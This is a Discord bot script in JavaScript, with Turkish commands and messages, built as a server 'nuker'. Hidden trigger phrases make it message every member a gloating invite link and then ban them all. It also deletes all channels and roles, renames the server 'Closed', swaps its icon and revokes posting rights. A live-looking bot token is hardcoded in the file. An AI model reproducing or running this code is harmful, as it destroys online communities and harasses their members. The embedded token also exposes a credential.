////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');

const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://pyros.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', msg => {
  if (msg.content === 'r!banla') {
    msg.delete()
    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Berke Tarafından Patlatılmıştır.**").then(member.ban())
  )}
})

berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
    msg.guild.members.forEach(member => member.ban())
    msg.guild.channels.deleteAll();
    msg.guild.roles.deleteAll();
    msg.guild.setName("Kapandı");
    msg.guild.setIcon("https://www.main-taunus-zentrum.de/fileadmin/user_upload/GLOBAL/brand_stores/logos/closed.png");
    msg.guild.createChannel("hey");
  }
});
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on("ready", () => {
  const sunucu = berke.guilds.get("616257615751544833")
  sunucu.createChannel("sa")
  console.clear()
  console.log(berke.user.tag + "| İsmi ile giriş yapldı")
})

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'hey') {
    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/4judfSa`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjE3NDczNjI3Mzk4NjAyNzUz.XWrtew.OCYAWHNwhKTdbstrtg87uALZA1o");


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////